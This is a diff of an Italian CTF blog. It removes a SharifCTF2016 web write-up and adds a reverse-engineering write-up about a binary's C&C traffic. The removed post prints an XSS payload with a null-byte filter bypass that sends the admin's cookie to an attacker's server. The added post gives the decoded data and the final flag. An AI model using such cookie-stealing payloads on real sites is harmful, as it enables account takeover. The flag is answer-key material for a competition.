@@ -1,132 +1,53 @@
 ---
 layout: post
-title:  "SharifCTF2016 - ExtraSecurity"
-date:   2016-12-19 15:30
+title:  "SharifCTF2016 - Nanomities"
+date:   2016-12-19 19:30
 categories: CTF
-tags: [web,SharifCTF2016]
+tags: [reverse,SharifCTF2016]
 author: jbz
 ---
 
+Nanomities era una challenge di reversing il cui testo recitava:
 
-Questa sfida web richiedeva di fare 'firmare' all'utente amministratore del sito un numero.  
+_Analyze the given file. Find the C&C IP address and the data sent to it in plain text.
+Flag = SharifCTF{md5(strcat(IP, Data))}_
 
-veniva offerta la possibilità di firmare con la propria chiave (impostata dal server in un cookie `KEY`) o di richiedere all'amministratore attraverso un form di effettuare la firma per noi. Dal testo non era chiaro quale fosse esattamente la strada da prendere: se fosse necessario rubare il cookie all'admin o se bastasse effettivamente utilizzare il form con qualche modifica.
-Il testo specificava esplicitamente che l'admin avrebbe utilizzato Chrome per vedere le richieste e che quindi sarebbe intervenuto l'XSS Auditor.
+Lo scopo era quindi di trovare indirizzo IP del server C&C ed il plaintext dei dati trasmessi. Il binario è disponibile [quì](https://github.com/jbzteam/CTF/raw/master/SharifCTF2016/Nanomites/Nanomites.exe).
 
-Il primo problema consisteva nel fatto che nella propria pagina per effettuare la firma, all'invio del form, veniva visualizzato un popup di errore e si veniva reindirizzati prima di qualsiasi altra azione.
+Il file è un eseguibile per Windows, come mostra anche l'output del comando `strings`:
 
-![Il popup di errore prima del reindirizzamento](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_4.png)
+`Nanomites.exe: PE32 executable (GUI) Intel 80386, for MS Windows`
 
-`http://ctf.sharif.edu:8083/wait_and_real_sign.php?content=259&id=<team_id>`
+Apriamo il fidato IDA e dato che il testo della challenge parlava di una connessione, facciamo una semplice ricerca per la parola `sock`. Infatti uno dei primi risultati è una `call ds:socket` all'indirizzo `00401373`. Sappiamo che dopo aver creato un socket avviene la connessione, quindi andando a guardare qualche riga dopo...
 
-Dal sorgente pagina si poteva notare questo codice:
+![Indirizzo IP](https://github.com/jbzteam/CTF/raw/master/SharifCTF2016/Nanomites/ip_address.png)
 
-```
-<script>
-    alert("Sorry, server is busy for a while!");
-    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ";
-</script>
-```
-Che è quello che causava la reindirizzazione.
+Troviamo l'indirizzo IP: `155.64.16.51`.
 
-Più in basso si notava anche il seguente codice, che però non veniva eseguito:
+Ok, abbiamo recuperato la prima informazione. Adesso dobbiamo trovare i dati. Dato che quell'indirizzo IP è attivo (o almeno lo era durante il CTF), lanciamo l'eseguibile e mettiamo in ascolto wireshark. Una volta stabilita la connessione troviamo il payload:
 
-```
-<script>
-    var timeElem = document.getElementById('time');
-    waitSeconds(timeElem, function () {
-        var c = parse(document.cookie || '');
-        var key = c['KEY'];
-        var body = {
-            //content: base64Decode("MjU5"),
-            content: "MjU5",
-            key: key,
-            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ'
-        };
-        postForm('/sign_and_store.php', body);
-    });
-</script>
+![Payload trasmesso](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/Nanomites/wireshark.png)
+
+Ovviamente è cifrato. Cerchiamo nel binario come. 
+
+![Cifratura con xor](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/Nanomites/xor.png)
+
+Una volta identificata la funzione che gestisce il payload, notiamo che nella variabile `var_1` viene inserito il valore `0x44`, poi viene aggiunto di due e viene fatto uno `xor`. La chiave quindi è il byte `0x46`.
+
+Con un paio di righe di python decifriamo il payload:
+
+```python
+data = [ 0x12, 0x2e, 0x2f, 0x35, 0x19, 0x0f, 0x35, 0x19, 0x12, 0x2e, 0x23, 0x19, 0x15, 0x23, 0x25, 0x34, 0x23, 0x32, 0x19, 0x02, 0x27, 0x32, 0x27, 0x46 ]
+print ''.join([chr(x ^ 0x46) for x in data])
 ```
 
-Con qualche test breve si intuiva subito che il campo GET `id` era plausibilmente vulnerabile ad XSS ma che un filtro custom bloccava le richieste contenenti la maggior parte delle keyword o simboli usati per tale scopo: eval, alert, document, this, etc. C'era inoltre un limite di caratteri che rendeva impossibile l'utilizzo di [jsfuck](http://www.jsfuck.com).
+E otteniamo come output `This_Is_The_Secret_Data`.
 
-La nostra idea era quella di sfruttare la vulnerabilità nel campo `id`, il cui contenuto veniva riflesso sia nel primo script che nel secondo per rubare il cookie `KEY` all'admin ed effettuare la firma in autonomia.
+Sappiamo quindi i due valori necessari per calcolare la flag. Dopo averli concatenati, ne calcoliamo l'`md5`:
 
-Cerchiamo quindi un payload che fermi l'esecuzione del primo script e che ci permetta invece di modificare l'url di destinazione in postForm nel secondo, il tutto senza venire bloccati dal filtro di Chrome.
-
-Il primo step è trovare un modo per rompere il primo script ma non il secondo, e questo è possibile grazie alla scelta degli organizzatori di usare apici doppi (") nel primo e apici singoli (') nel secondo:
-
-`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>};prompt(c['KEY']);a={'p%27:'"&content=1`
-
-Questo payload contiene un apice doppio alla fine che rompe la sintassi del primo script, mentre chiude con un apice semplice il campo id nel secondo script, aggiunge `prompt(c['KEY'])` (equivalente di `alert(c['KEY']` ma non filtrato), e crea un nuovo dict per completare la sintassi già esistente.
-
-Risulta quindi
-
-```
-<script>
-    alert("Sorry, server is busy for a while!");
-    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"";
-</script>
-<script>
-    var timeElem = document.getElementById('time');
-    waitSeconds(timeElem, function () {
-        var c = parse(document.cookie || '');
-        var key = c['KEY'];
-        var body = {
-            //content: base64Decode("MQ=="),
-            content: "MQ==",
-            key: key,
-            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"'
-        };
-        postForm('/sign_and_store.php', body);
-    });
-</script>
-
+```bash
+$ echo -n '155.64.16.51This_Is_The_Secret_Data' | md5
+fb0e90f2ec7a701783e70e674fa94848
 ```
 
-![PoC](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_2.png)
-
-Ora il grosso problema era il fatto che anche qualsiasi declinazione della parola `post`, `xml` o simili faceva scattare il filtro.
-Dopo diversi tentativi, avendo intuito che il filtro fosse realizzato applicativamente (e che quindi non ci fosse un WAF vero e proprio), ed essendo l'applicazione in PHP, iniziammo a provare inserendo null bytes (%00) e altri caratteri come %0a e %0d.
-Una volta scoperto che effettivamente il filtro falliva a processare qualsiasi cosa posta dopo un null byte, continuando i test notammo che il bypass funzionava anche effettuando il double encode di %00, cioè %2500 il che preveniva che il null byte venisse stampato nella pagina, che per qualche motivo causava qualche problema nell'esecuzione dello script (al momento del writeup non riesco a riprodurre il problema..).
-
-Il payload finale quindi consisteva in:
-
-`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1`
-
-Che risulta nel seguente codice:
-
-```
-<script>
-    alert("Sorry, server is busy for a while!");
-    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
-/*%00*/
-postForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"";
-</script>
-<script>
-    var timeElem = document.getElementById('time');
-    waitSeconds(timeElem, function () {
-        var c = parse(document.cookie || '');
-        var key = c['KEY'];
-        var body = {
-            //content: base64Decode("MQ=="),
-            content: "MQ==",
-            key: key,
-            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
-/*%00*/
-postForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"'
-        };
-        postForm('/sign_and_store.php', body);
-    });
-</script>
-
-```
-
-![Gli errori nella console dimostrano la mancata esecuzione del primo script e la corretta sintassi del secondo](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_3.png)
-
-Da `garbage` in poi il codice serviva solo per non causare errori di sintassi.
-Da notare che il filtro XSS di Chrome in questo scenario non si è mai considerato in quanto la XSS non richiede tag HTML poiché il payload finisce già all'interno di tag `<script>`.
-
-La richiesta di firma all'admin inviava una POST che conteneva un campo URL che lasciava intendere che fosse quello che l'admin avrebbe visitato per effettuare la firma. Bisognava quindi modificare quel campo con il payload descritto sopra.
-
-Purtroppo non siamo riusciti a risolverla in tempo per ottenere il punteggio.
+La flag è quindi `SharifCTF{fb0e90f2ec7a701783e70e674fa94848}`.
